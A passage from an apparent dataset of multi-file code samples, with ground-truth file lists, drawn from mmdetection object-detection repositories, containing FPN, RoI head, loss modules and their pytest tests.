act_cfg=act_cfg,\n                    inplace=False)\n                self.fpn_convs.append(extra_fpn_conv)\n\n    @auto_fp16()\n    def forward(self, inputs):\n\n        assert len(inputs) == len(self.in_channels)\n\n\n        laterals = [\n            lateral_conv(inputs[i + self.start_level])\n            for i, lateral_conv in enumerate(self.lateral_convs)\n        ]\n\n\n        used_backbone_levels = len(laterals)\n        for i in range(used_backbone_levels - 1, 0, -1):\n\n\n            if 'scale_factor' in self.upsample_cfg:\n                laterals[i - 1] += F.interpolate(laterals[i],\n                                                 **self.upsample_cfg)\n            else:\n                prev_shape = laterals[i - 1].shape[2:]\n                laterals[i - 1] += F.interpolate(\n                    laterals[i], size=prev_shape, **self.upsample_cfg)\n\n\n\n        outs = [\n            self.fpn_convs[i](laterals[i]) for i in range(used_backbone_levels)\n        ]\n\n        if self.num_outs > len(outs):\n\n\n            if not self.add_extra_convs:\n                for i in range(self.num_outs - used_backbone_levels):\n                    outs.append(F.max_pool2d(outs[-1], 1, stride=2))\n\n            else:\n                if self.add_extra_convs == 'on_input':\n                    extra_source = inputs[self.backbone_end_level - 1]\n                elif self.add_extra_convs == 'on_lateral':\n                    extra_source = laterals[-1]\n                elif self.add_extra_convs == 'on_output':\n                    extra_source = outs[-1]\n                else:\n                    raise NotImplementedError\n                outs.append(self.fpn_convs[used_backbone_levels](extra_source))\n                for i in range(used_backbone_levels + 1, self.num_outs):\n                    if self.relu_before_extra_convs:\n                        outs.append(self.fpn_convs[i](F.relu(outs[-1])))\n                    else:\n                        outs.append(self.fpn_convs[i](outs[-1]))\n        return tuple(outs)\n\n'OpenMMLab-BoxInst/mmdet/models/necks/__init__.py'\n:from .bfp import BFP\nfrom .channel_mapper import ChannelMapper\nfrom .ct_resnet_neck import CTResNetNeck\nfrom .dilated_encoder import DilatedEncoder\nfrom .fpg import FPG\nfrom .fpn import FPN\nfrom .fpn_carafe import FPN_CARAFE\nfrom .hrfpn import HRFPN\nfrom .nas_fpn import NASFPN\nfrom .nasfcos_fpn import NASFCOS_FPN\nfrom .pafpn import PAFPN\nfrom .rfp import RFP\nfrom .ssd_neck import SSDNeck\nfrom .yolo_neck import YOLOV3Neck\n\n__all__ = [\n    'FPN', 'BFP', 'ChannelMapper', 'HRFPN', 'NASFPN', 'FPN_CARAFE', 'PAFPN',\n    'NASFCOS_FPN', 'RFP', 'YOLOV3Neck', 'FPG', 'DilatedEncoder',\n    'CTResNetNeck', 'SSDNeck'\n]\n\n'OpenMMLab-BoxInst/tests/test_models/test_necks.py'\n:import pytest\nimport torch\nfrom torch.nn.modules.batchnorm import _BatchNorm\n\nfrom mmdet.models.necks import (FPN, ChannelMapper, CTResNetNeck,\n                                DilatedEncoder, SSDNeck, YOLOV3Neck)\n\n\ndef test_fpn():\n\n    s = 64\n    in_channels = [8, 16, 32, 64]\n    feat_sizes = [s // 2**i for i in range(4)]\n    out_channels = 8\n\n    with pytest.raises(AssertionError):\n        FPN(in_channels=in_channels,\n            out_channels=out_channels,\n            start_level=1,\n            num_outs=2)\n\n\n    with pytest.raises(AssertionError):\n        FPN(in_channels=in_channels,\n            out_channels=out_channels,\n            start_level=1,\n            end_level=4,\n            num_outs=2)\n\n\n    with pytest.raises(AssertionError):\n        FPN(in_channels=in_channels,\n            out_channels=out_channels,\n            start_level=1,\n            end_level=3,\n            num_outs=1)\n\n\n    with pytest.raises(AssertionError):\n        FPN(in_channels=in_channels,\n            out_channels=out_channels,\n            start_level=1,\n            add_extra_convs='on_xxx',\n            num_outs=5)\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        start_level=1,\n        add_extra_convs=True,\n        num_outs=5)\n\n\n    feats = [\n        torch.rand(1, in_channels[i], feat_sizes[i], feat_sizes[i])\n        for i in range(len(in_channels))\n    ]\n    outs = fpn_model(feats)\n    assert fpn_model.add_extra_convs == 'on_input'\n    assert len(outs) == fpn_model.num_outs\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        start_level=1,\n        add_extra_convs=False,\n        num_outs=5)\n    outs = fpn_model(feats)\n    assert len(outs) == fpn_model.num_outs\n    assert not fpn_model.add_extra_convs\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        start_level=1,\n        add_extra_convs=True,\n        no_norm_on_lateral=False,\n        norm_cfg=dict(type='BN', requires_grad=True),\n        num_outs=5)\n    outs = fpn_model(feats)\n    assert len(outs) == fpn_model.num_outs\n    assert fpn_model.add_extra_convs == 'on_input'\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n    bn_exist = False\n    for m in fpn_model.modules():\n        if isinstance(m, _BatchNorm):\n            bn_exist = True\n    assert bn_exist\n\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        start_level=1,\n        add_extra_convs=True,\n        upsample_cfg=dict(mode='bilinear', align_corners=True),\n        num_outs=5)\n    fpn_model(feats)\n    outs = fpn_model(feats)\n    assert len(outs) == fpn_model.num_outs\n    assert fpn_model.add_extra_convs == 'on_input'\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        start_level=1,\n        add_extra_convs=True,\n        upsample_cfg=dict(scale_factor=2),\n        num_outs=5)\n    outs = fpn_model(feats)\n    assert len(outs) == fpn_model.num_outs\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        add_extra_convs='on_input',\n        start_level=1,\n        num_outs=5)\n    assert fpn_model.add_extra_convs == 'on_input'\n    outs = fpn_model(feats)\n    assert len(outs) == fpn_model.num_outs\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        add_extra_convs='on_lateral',\n        start_level=1,\n        num_outs=5)\n    assert fpn_model.add_extra_convs == 'on_lateral'\n    outs = fpn_model(feats)\n    assert len(outs) == fpn_model.num_outs\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\n    fpn_model = FPN(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        add_extra_convs='on_output',\n        start_level=1,\n        num_outs=5)\n    assert fpn_model.add_extra_convs == 'on_output'\n    outs = fpn_model(feats)\n    assert len(outs) == fpn_model.num_outs\n    for i in range(fpn_model.num_outs):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\ndef test_channel_mapper():\n\n    s = 64\n    in_channels = [8, 16, 32, 64]\n    feat_sizes = [s // 2**i for i in range(4)]\n    out_channels = 8\n    kernel_size = 3\n    feats = [\n        torch.rand(1, in_channels[i], feat_sizes[i], feat_sizes[i])\n        for i in range(len(in_channels))\n    ]\n\n\n    with pytest.raises(AssertionError):\n        channel_mapper = ChannelMapper(\n            in_channels=10, out_channels=out_channels, kernel_size=kernel_size)\n\n\n    with pytest.raises(AssertionError):\n        channel_mapper = ChannelMapper(\n            in_channels=in_channels[:-1],\n            out_channels=out_channels,\n            kernel_size=kernel_size)\n        channel_mapper(feats)\n\n    channel_mapper = ChannelMapper(\n        in_channels=in_channels,\n        out_channels=out_channels,\n        kernel_size=kernel_size)\n\n    outs = channel_mapper(feats)\n    assert len(outs) == len(feats)\n    for i in range(len(feats)):\n        outs[i].shape[1] == out_channels\n        outs[i].shape[2] == outs[i].shape[3] == s // (2**i)\n\n\ndef test_dilated_encoder():\n    in_channels = 16\n    out_channels = 32\n    out_shape = 34\n    dilated_encoder = DilatedEncoder(in_channels, out_channels, 16, 2)\n    feat = [torch.rand(1, in_channels, 34, 34)]\n    out_feat = dilated_encoder(feat)[0]\n    assert out_feat.shape == (1, out_channels, out_shape, out_shape)\n\n\ndef test_ct_resnet_neck():\n\n    with pytest.raises(TypeError):\n        CTResNetNeck(\n            in_channel=10, num_deconv_filters=10, num_deconv_kernels=4)\n\n\n    with pytest.raises(AssertionError):\n        CTResNetNeck(\n            in_channel=10,\n            num_deconv_filters=(10, 10),\n            num_deconv_kernels=(4, ))\n\n    in_channels = 16\n    num_filters = (8, 8)\n    num_kernels = (4, 4)\n    feat = torch.rand(1, 16, 4, 4)\n    ct_resnet_neck = CTResNetNeck(\n        in_channel=in_channels,\n        num_deconv_filters=num_filters,\n        num_deconv_kernels=num_kernels,\n        use_dcn=False)\n\n\n    with pytest.raises(AssertionError):\n        ct_resnet_neck(feat)\n\n    out_feat = ct_resnet_neck([feat])[0]\n    assert out_feat.shape == (1, num_filters[-1], 16, 16)\n\n    if torch.cuda.is_available():\n\n        ct_resnet_neck = CTResNetNeck(\n            in_channel=in_channels,\n            num_deconv_filters=num_filters,\n            num_deconv_kernels=num_kernels)\n        ct_resnet_neck = ct_resnet_neck.cuda()\n        feat = feat.cuda()\n        out_feat = ct_resnet_neck([feat])[0]\n        assert out_feat.shape == (1, num_filters[-1], 16, 16)\n\n\ndef test_yolov3_neck():\n\n    with pytest.raises(AssertionError):\n        YOLOV3Neck(num_scales=3, in_channels=[16, 8, 4], out_channels=[8, 4])\n\n\n    with pytest.raises(AssertionError):\n        neck = YOLOV3Neck(\n            num_scales=3, in_channels=[16, 8, 4], out_channels=[8, 4, 2])\n        feats = (torch.rand(1, 4, 16, 16), torch.rand(1, 8, 16, 16))\n        neck(feats)\n\n\n    s = 32\n    in_channels = [16, 8, 4]\n    out_channels = [8, 4, 2]\n    feat_sizes = [s // 2**i for i in range(len(in_channels) - 1, -1, -1)]\n    feats = [\n        torch.rand(1, in_channels[i], feat_sizes[i], feat_sizes[i])\n        for i in range(len(in_channels) - 1, -1, -1)\n    ]\n    neck = YOLOV3Neck(\n        num_scales=3, in_channels=in_channels, out_channels=out_channels)\n    outs = neck(feats)\n\n    assert len(outs) == len(feats)\n    for i in range(len(outs)):\n        assert outs[i].shape == \\\n               (1, out_channels[i], feat_sizes[i], feat_sizes[i])\n\n\n    s = 32\n    in_channels = [32, 8, 16]\n    out_channels = [19, 21, 5]\n    feat_sizes = [s // 2**i for i in range(len(in_channels) - 1, -1, -1)]\n    feats = [\n        torch.rand(1, in_channels[i], feat_sizes[i], feat_sizes[i])\n        for i in range(len(in_channels) - 1, -1, -1)\n    ]\n    neck = YOLOV3Neck(\n        num_scales=3, in_channels=in_channels, out_channels=out_channels)\n    outs = neck(feats)\n\n    assert len(outs) == len(feats)\n    for i in range(len(outs)):\n        assert outs[i].shape == \\\n               (1, out_channels[i], feat_sizes[i], feat_sizes[i])\n\n\ndef test_ssd_neck():\n\n    with pytest.raises(AssertionError):\n        SSDNeck(\n            in_channels=[8, 16],\n            out_channels=[8, 16, 32],\n            level_strides=[2],\n            level_paddings=[2, 1])\n\n\n    with pytest.raises(AssertionError):\n        SSDNeck(\n            in_channels=[8, 16],\n            out_channels=[8],\n            level_strides=[2],\n            level_paddings=[2])\n\n\n    with pytest.raises(AssertionError):\n        SSDNeck(\n            in_channels=[8, 16],\n            out_channels=[4, 16, 64],\n            level_strides=[2, 2],\n            level_paddings=[2, 2])\n\n\n    with pytest.raises(AssertionError):\n        SSDNeck(\n            in_channels=[8, 16],\n            out_channels=[4, 16, 64],\n            level_strides=[2],\n            level_paddings=[2])\n\n    ssd_neck = SSDNeck(\n        in_channels=[4],\n        out_channels=[4, 8, 16],\n        level_strides=[2, 1],\n        level_paddings=[1, 0])\n    feats = (torch.rand(1, 4, 16, 16), )\n    outs = ssd_neck(feats)\n    assert outs[0].shape == (1, 4, 16, 16)\n    assert outs[1].shape == (1, 8, 8, 8)\n    assert outs[2].shape == (1, 16, 6, 6)\n\n\n    ssd_neck = SSDNeck(\n        in_channels=[4, 8],\n        out_channels=[4, 8, 16],\n        level_strides=[1],\n        level_paddings=[1],\n        l2_norm_scale=None,\n        use_depthwise=True,\n        norm_cfg=dict(type='BN'),\n        act_cfg=dict(type='ReLU6'))\n    assert not hasattr(ssd_neck, 'l2_norm')\n\n    from mmcv.cnn.bricks import DepthwiseSeparableConvModule\n    assert isinstance(ssd_neck.extra_layers[0][-1],\n                      DepthwiseSeparableConvModule)\n\n    feats = (torch.rand(1, 4, 8, 8), torch.rand(1, 8, 8, 8))\n    outs = ssd_neck(feats)\n    assert outs[0].shape == (1, 4, 8, 8)\n    assert outs[1].shape == (1, 8, 8, 8)\n    assert outs[2].shape == (1, 16, 8, 8)\n",
        "gt": [
            "'OpenMMLab-BoxInst/mmdet/models/necks/fpn.py'",
            "'OpenMMLab-BoxInst/mmdet/models/necks/__init__.py'",
            "'OpenMMLab-BoxInst/tests/test_models/test_necks.py'"
        ]
    },
    {
        "files": [
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/roi_heads/__init__.py'",
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/roi_heads/dynamic_roi_head.py'",
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/losses/__init__.py'",
            "'DSGN2/mmdetection-v2.22.0/tests/test_models/test_dense_heads/test_pisa_head.py'",
            "'DSGN2/mmdetection-v2.22.0/mmdet/models/losses/mse_loss.py'"
        ],
        "content": "'DSGN2/mmdetection-v2.22.0/mmdet/models/roi_heads/__init__.py'\n:\nfrom .base_roi_head import BaseRoIHead\nfrom .bbox_heads import (BBoxHead, ConvFCBBoxHead, DIIHead,\n                         DoubleConvFCBBoxHead, SABLHead, SCNetBBoxHead,\n                         Shared2FCBBoxHead, Shared4Conv1FCBBoxHead)\nfrom .cascade_roi_head import CascadeRoIHead\nfrom .double_roi_head import DoubleHeadRoIHead\nfrom .dynamic_roi_head import DynamicRoIHead\nfrom .grid_roi_head import GridRoIHead\nfrom .htc_roi_head import HybridTaskCascadeRoIHead\nfrom .mask_heads import (CoarseMaskHead, FCNMaskHead, FeatureRelayHead,\n                         FusedSemanticHead, GlobalContextHead, GridHead,\n                         HTCMaskHead, MaskIoUHead, MaskPointHead,\n                         SCNetMaskHead, SCNetSemanticHead)\nfrom .mask_scoring_roi_head import MaskScoringRoIHead\nfrom .pisa_roi_head import PISARoIHead\nfrom .point_rend_roi_head import PointRendRoIHead\nfrom .roi_extractors import (BaseRoIExtractor, GenericRoIExtractor,\n                             SingleRoIExtractor)\nfrom .scnet_roi_head import SCNetRoIHead\nfrom .shared_heads import ResLayer\nfrom .sparse_roi_head import SparseRoIHead\nfrom .standard_roi_head import StandardRoIHead\nfrom .trident_roi_head import TridentRoIHead\n\n__all__ = [\n    'BaseRoIHead', 'CascadeRoIHead', 'DoubleHeadRoIHead', 'MaskScoringRoIHead',\n    'HybridTaskCascadeRoIHead', 'GridRoIHead', 'ResLayer', 'BBoxHead',\n    'ConvFCBBoxHead', 'DIIHead', 'SABLHead', 'Shared2FCBBoxHead',\n    'StandardRoIHead', 'Shared4Conv1FCBBoxHead', 'DoubleConvFCBBoxHead',\n    'FCNMaskHead', 'HTCMaskHead', 'FusedSemanticHead', 'GridHead',\n    'MaskIoUHead', 'BaseRoIExtractor', 'GenericRoIExtractor',\n    'SingleRoIExtractor', 'PISARoIHead', 'PointRendRoIHead', 'MaskPointHead',\n    'CoarseMaskHead', 'DynamicRoIHead', 'SparseRoIHead', 'TridentRoIHead',\n    'SCNetRoIHead', 'SCNetMaskHead', 'SCNetSemanticHead', 'SCNetBBoxHead',\n    'FeatureRelayHead', 'GlobalContextHead'\n]\n\n'DSGN2/mmdetection-v2.22.0/mmdet/models/roi_heads/dynamic_roi_head.py'\n:\nimport numpy as np\nimport torch\n\nfrom mmdet.core import bbox2roi\nfrom mmdet.models.losses import SmoothL1Loss\nfrom ..builder import HEADS\nfrom .standard_roi_head import StandardRoIHead\n\nEPS = 1e-15\n\n\n@HEADS.register_module()\nclass DynamicRoIHead(StandardRoIHead):\n\n\n    def __init__(self, **kwargs):\n        super(DynamicRoIHead, self).__init__(**kwargs)\n        assert isinstance(self.bbox_head.loss_bbox, SmoothL1Loss)\n\n        self.iou_history = []\n\n        self.beta_history = []\n\n    def forward_train(self,\n                      x,\n                      img_metas,\n                      proposal_list,\n                      gt_bboxes,\n                      gt_labels,\n                      gt_bboxes_ignore=None,\n                      gt_masks=None):\n\n\n        if self.with_bbox or self.with_mask:\n            num_imgs = len(img_metas)\n            if gt_bboxes_ignore is None:\n                gt_bboxes_ignore = [None for _ in range(num_imgs)]\n            sampling_results = []\n            cur_iou = []\n            for i in range(num_imgs):\n                assign_result = self.bbox_assigner.assign(\n                    proposal_list[i], gt_bboxes[i], gt_bboxes_ignore[i],\n                    gt_labels[i])\n                sampling_result = self.bbox_sampler.sample(\n                    assign_result,\n                    proposal_list[i],\n                    gt_bboxes[i],\n                    gt_labels[i],\n                    feats=[lvl_feat[i][None] for lvl_feat in x])\n\n                iou_topk = min(self.train_cfg.dynamic_rcnn.iou_topk,\n                               len(assign_result.max_overlaps))\n                ious, _ = torch.topk(assign_result.max_overlaps, iou_topk)\n                cur_iou.append(ious[-1].item())\n                sampling_results.append(sampling_result)\n\n            cur_iou = np.mean(cur_iou)\n            self.iou_history.append(cur_iou)\n\n        losses = dict()\n\n        if self.with_bbox:\n            bbox_results = self._bbox_forward_train(x, sampling_results,\n                                                    gt_bboxes, gt_labels,\n                                                    img_metas)\n            losses.update(bbox_results['loss_bbox'])\n\n\n        if self.with_mask:\n            mask_results = self._mask_forward_train(x, sampling_results,\n                                                    bbox_results['bbox_feats'],\n                                                    gt_masks, img_metas)\n            losses.update(mask_results['loss_mask'])\n\n\n        update_iter_interval = self.train_cfg.dynamic_rcnn.update_iter_interval\n        if len(self.iou_history) % update_iter_interval == 0:\n            new_iou_thr, new_beta = self.update_hyperparameters()\n\n        return losses\n\n    def _bbox_forward_train(self, x, sampling_results, gt_bboxes, gt_labels,\n                            img_metas):\n        num_imgs = len(img_metas)\n        rois = bbox2roi([res.bboxes for res in sampling_results])\n        bbox_results = self._bbox_forward(x, rois)\n\n        bbox_targets = self.bbox_head.get_targets(sampling_results, gt_bboxes,\n                                                  gt_labels, self.train_cfg)\n\n\n\n        pos_inds = bbox_targets[3][:, 0].nonzero().squeeze(1)\n        num_pos = len(pos_inds)\n        cur_target = bbox_targets[2][pos_inds, :2].abs().mean(dim=1)\n        beta_topk = min(self.train_cfg.dynamic_rcnn.beta_topk * num_imgs,\n                        num_pos)\n        cur_target = torch.kthvalue(cur_target, beta_topk)[0].item()\n        self.beta_history.append(cur_target)\n        loss_bbox = self.bbox_head.loss(bbox_results['cls_score'],\n                                        bbox_results['bbox_pred'], rois,\n                                        *bbox_targets)\n\n        bbox_results.update(loss_bbox=loss_bbox)\n        return bbox_results\n\n    def update_hyperparameters(self):\n\n        new_iou_thr = max(self.train_cfg.dynamic_rcnn.initial_iou,\n                          np.mean(self.iou_history))\n        self.iou_history = []\n        self.bbox_assigner.pos_iou_thr = new_iou_thr\n        self.bbox_assigner.neg_iou_thr = new_iou_thr\n        self.bbox_assigner.min_pos_iou = new_iou_thr\n        if (np.median(self.beta_history) < EPS):\n\n            new_beta = self.bbox_head.loss_bbox.beta\n        else:\n            new_beta = min(self.train_cfg.dynamic_rcnn.initial_beta,\n                           np.median(self.beta_history))\n        self.beta_history = []\n        self.bbox_head.loss_bbox.beta = new_beta\n        return new_iou_thr, new_beta\n\n'DSGN2/mmdetection-v2.22.0/mmdet/models/losses/__init__.py'\n:\nfrom .accuracy import Accuracy, accuracy\nfrom .ae_loss import AssociativeEmbeddingLoss\nfrom .balanced_l1_loss import BalancedL1Loss, balanced_l1_loss\nfrom .cross_entropy_loss import (CrossEntropyLoss, binary_cross_entropy,\n                                 cross_entropy, mask_cross_entropy)\nfrom .dice_loss import DiceLoss\nfrom .focal_loss import FocalLoss, sigmoid_focal_loss\nfrom .gaussian_focal_loss import GaussianFocalLoss\nfrom .gfocal_loss import DistributionFocalLoss, QualityFocalLoss\nfrom .ghm_loss import GHMC, GHMR\nfrom .iou_loss import (BoundedIoULoss, CIoULoss, DIoULoss, GIoULoss, IoULoss,\n                       bounded_iou_loss, iou_loss)\nfrom .kd_loss import KnowledgeDistillationKLDivLoss\nfrom .mse_loss import MSELoss, mse_loss\nfrom .pisa_loss import carl_loss, isr_p\nfrom .seesaw_loss import SeesawLoss\nfrom .smooth_l1_loss import L1Loss, SmoothL1Loss, l1_loss, smooth_l1_loss\nfrom .utils import reduce_loss, weight_reduce_loss, weighted_loss\nfrom .varifocal_loss import VarifocalLoss\n\n__all__ = [\n    'accuracy', 'Accuracy', 'cross_entropy', 'binary_cross_entropy',\n    'mask_cross_entropy', 'CrossEntropyLoss', 'sigmoid_focal_loss',\n    'FocalLoss', 'smooth_l1_loss', 'SmoothL1Loss', 'balanced_l1_loss',\n    'BalancedL1Loss', 'mse_loss', 'MSELoss', 'iou_loss', 'bounded_iou_loss',\n    'IoULoss', 'BoundedIoULoss', 'GIoULoss', 'DIoULoss', 'CIoULoss', 'GHMC',\n    'GHMR', 'reduce_loss', 'weight_reduce_loss', 'weighted_loss', 'L1Loss',\n    'l1_loss', 'isr_p', 'carl_loss', 'AssociativeEmbeddingLoss',\n    'GaussianFocalLoss', 'QualityFocalLoss', 'DistributionFocalLoss',\n    'VarifocalLoss', 'KnowledgeDistillationKLDivLoss', 'SeesawLoss', 'DiceLoss'\n]\n\n'DSGN2/mmdetection-v2.22.0/tests/test_models/test_dense_heads/test_pisa_head.py'\n:\nimport mmcv\nimport torch\n\nfrom mmdet.models.dense_heads import PISARetinaHead, PISASSDHead\nfrom mmdet.models.roi_heads import PISARoIHead\n\n\ndef test_pisa_retinanet_head_loss():\n\n    s = 256\n    img_metas = [{\n        'img_shape': (s, s, 3),\n        'scale_factor': 1,\n        'pad_shape': (s, s, 3)\n    }]\n\n    cfg = mmcv.Config(\n        dict(\n            assigner=dict(\n                type='MaxIoUAssigner',\n                pos_iou_thr=0.7,\n                neg_iou_thr=0.3,\n                min_pos_iou=0.3,\n                match_low_quality=True,\n                ignore_iof_thr=-1),\n            sampler=dict(\n                type='RandomSampler',\n                num=256,\n                pos_fraction=0.5,\n                neg_pos_ub=-1,\n                add_gt_as_proposals=False),\n            isr=dict(k=2., bias=0.),\n            carl=dict(k=1., bias=0.2),\n            allowed_border=0,\n            pos_weight=-1,\n            debug=False))\n    self = PISARetinaHead(num_classes=4, in_channels=1, train_cfg=cfg)\n\n\n    feat = [\n        torch.rand(1, 1, s // (2**(i + 2)), s // (2**(i + 2)))\n        for i in range(len(self.anchor_generator.strides))\n    ]\n    cls_scores, bbox_preds = self.forward(feat)\n\n\n    gt_bboxes = [torch.empty((0, 4))]\n    gt_labels = [torch.LongTensor([])]\n\n    gt_bboxes_ignore = None\n    empty_gt_losses = self.loss(cls_scores, bbox_preds, gt_bboxes, gt_labels,\n                                img_metas, gt_bboxes_ignore)\n\n\n    empty_cls_loss = empty_gt_losses['loss_cls'].sum()\n    empty_box_loss = empty_gt_losses['loss_bbox'].sum()\n    assert empty_cls_loss.item() > 0, 'cls loss should be non-zero'\n    assert empty_box_loss.item() == 0, (\n        'there should be no box loss when there are no true boxes')\n\n\n\n    gt_bboxes = [\n        torch.Tensor([[23.6667, 23.8757, 238.6326, 151.8874]]),\n    ]\n    gt_labels = [torch.LongTensor([2])]\n    one_gt_losses = self.loss(cls_scores, bbox_preds, gt_bboxes, gt_labels,\n                              img_metas, gt_bboxes_ignore)\n    onegt_cls_loss = one_gt_losses['loss_cls'].sum()\n    onegt_box_loss = one_gt_losses['loss_bbox'].sum()\n    assert onegt_cls_loss.item() > 0, 'cls loss should be non-zero'\n    assert onegt_box_loss.item() > 0, 'box loss should be non-zero'\n\n\ndef test_pisa_ssd_head_loss():\n\n    s = 256\n    img_metas = [{\n        'img_shape': (s, s, 3),\n        'scale_factor': 1,\n        'pad_shape': (s, s, 3)\n    }]\n\n    cfg = mmcv.Config(\n        dict(\n            assigner=dict(\n                type='MaxIoUAssigner',\n                pos_iou_thr=0.5,\n                neg_iou_thr=0.5,\n                min_pos_iou=0.,\n                ignore_iof_thr=-1,\n                gt_max_assign_all=False),\n            isr=dict(k=2., bias=0.),\n            carl=dict(k=1., bias=0.2),\n            smoothl1_beta=1.,\n            allowed_border=-1,\n            pos_weight=-1,\n            neg_pos_ratio=3,\n            debug=False))\n    ssd_anchor_generator = dict(\n        type='SSDAnchorGenerator',\n        scale_major=False,\n        input_size=300,\n        strides=[1],\n        ratios=([2], ),\n        basesize_ratio_range=(0.15, 0.9))\n    self = PISASSDHead(\n        num_classes=4,\n        in_channels=(1, ),\n        train_cfg=cfg,\n        anchor_generator=ssd_anchor_generator)\n\n\n    feat = [\n        torch.rand(1, 1, s // (2**(i + 2)), s // (2**(i + 2)))\n        for i in range(len(self.anchor_generator.strides))\n    ]\n    cls_scores, bbox_preds = self.forward(feat)\n\n\n    gt_bboxes = [torch.empty((0, 4))]\n    gt_labels = [torch.LongTensor([])]\n\n    gt_bboxes_ignore = None\n    empty_gt_losses = self.loss(cls_scores, bbox_preds, gt_bboxes, gt_labels,\n                                img_metas, gt_bboxes_ignore)\n\n\n    empty_cls_loss = sum(empty_gt_losses['loss_cls'])\n    empty_box_loss = sum(empty_gt_losses['loss_bbox'])\n\n    assert empty_cls_loss.item() == 0, 'cls loss should be non-zero'\n    assert empty_box_loss.item() == 0, (\n        'there should be no box loss when there are no true boxes')\n\n\n\n    gt_bboxes = [\n        torch.Tensor([[23.6667, 23.8757, 238.6326, 151.8874]]),\n    ]\n    gt_labels = [torch.LongTensor([2])]\n    one_gt_losses = self.loss(cls_scores, bbox_preds, gt_bboxes, gt_labels,\n                              img_metas, gt_bboxes_ignore)\n    onegt_cls_loss = sum(one_gt_losses['loss_cls'])\n    onegt_box_loss = sum(one_gt_losses['loss_bbox'])\n    assert onegt_cls_loss.item() > 0, 'cls loss should be non-zero'\n    assert onegt_box_loss.item() > 0, 'box loss should be non-zero'\n\n\ndef test_pisa_roi_head_loss():\n\n    train_cfg = mmcv.Config(\n        dict(\n            assigner=dict(\n                type='MaxIoUAssigner',\n                pos_iou_thr=0.7,\n                neg_iou_thr=0.3,\n                min_pos_iou=0.3,\n                match_low_quality=True,\n                ignore_iof_thr=-1),\n            sampler=dict(\n                type='ScoreHLRSampler',\n                num=4,\n                pos_fraction=0.25,\n                neg_pos_ub=-1,\n                add_gt_as_proposals=True,\n                k=0.5,\n                bias=0.),\n            isr=dict(k=2., bias=0.),\n            carl=dict(k=1., bias=0.2),\n            allowed_border=0,\n            pos_weight=-1,\n            debug=False))\n\n    bbox_roi_extractor = dict(\n        type='SingleRoIExtractor',\n        roi_layer=dict(type='RoIAlign', output_size=7, sampling_ratio=0),\n        out_channels=1,\n        featmap_strides=[1])\n\n    bbox_head = dict(\n        type='Shared2FCBBoxHead',\n        in_channels=1,\n        fc_out_channels=2,\n        roi_feat_size=7,\n        num_classes=4,\n        bbox_coder=dict(\n            type='DeltaXYWHBBoxCoder',\n            target_means=[0., 0., 0., 0.],\n            target_stds=[0.1, 0.1, 0.2, 0.2]),\n        reg_class_agnostic=False,\n        loss_cls=dict(\n            type='CrossEntropyLoss', use_sigmoid=False, loss_weight=1.0),\n        loss_bbox=dict(type='L1Loss', loss_weight=1.0))\n\n    self = PISARoIHead(bbox_roi_extractor, bbox_head, train_cfg=train_cfg)\n\n    s = 256\n    img_metas = [{\n        'img_shape': (s, s, 3),\n        'scale_factor': 1,\n        'pad_shape': (s, s, 3)\n    }]\n\n\n    feat = [\n        torch.rand(1, 1, s // (2**(i + 2)), s // (2**(i + 2)))\n        for i in range(1)\n    ]\n\n    proposal_list = [\n        torch.Tensor([[22.6667, 22.8757, 238.6326, 151.8874], [0, 3, 5, 7]])\n    ]\n\n\n    gt_bboxes = [torch.empty((0, 4))]\n    gt_labels = [torch.LongTensor([])]\n    gt_bboxes_ignore = None\n\n    empty_gt_losses = self.forward_train(feat, img_metas, proposal_list,\n                                         gt_bboxes, gt_labels,\n                                         gt_bboxes_ignore)\n\n\n\n    empty_cls_loss = empty_gt_losses['loss_cls'].sum()\n    empty_box_loss = empty_gt_losses['loss_bbox'].sum()\n    assert empty_cls_loss.item() > 0, 'cls loss should be non-zero'\n    assert empty_box_loss.item() == 0, (\n        'there should be no box loss when there are no true boxes')\n\n\n\n    gt_bboxes = [\n        torch.Tensor([[23.6667, 23.8757, 238.6326, 151.8874]]),\n    ]\n    gt_labels = [torch.LongTensor([2])]\n\n    one_gt_losses = self.forward_train(feat, img_metas, proposal_list,\n                                       gt_bboxes, gt_labels, gt_bboxes_ignore)\n    onegt_cls_loss = one_gt_losses['loss_cls'].sum()\n    onegt_box_loss = one_gt_losses['loss_bbox'].sum()\n    assert onegt_cls_loss.item() > 0, 'cls loss should be non-zero'\n    assert onegt_box_loss.item() > 0, 'box loss should be non-zero'\n\n'DSGN2/mmdetection-v2.22.0/mmdet/models/losses/mse_loss.py'\n:\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nfrom ..builder import LOSSES\nfrom .utils import weighted_loss\n\n\n@weighted_loss\ndef mse_loss(pred, target):\n\n    return F.mse_loss(pred, target, reduction='none')\n\n\n@LOSSES.register_module()\nclass MSELoss(nn.Module):\n    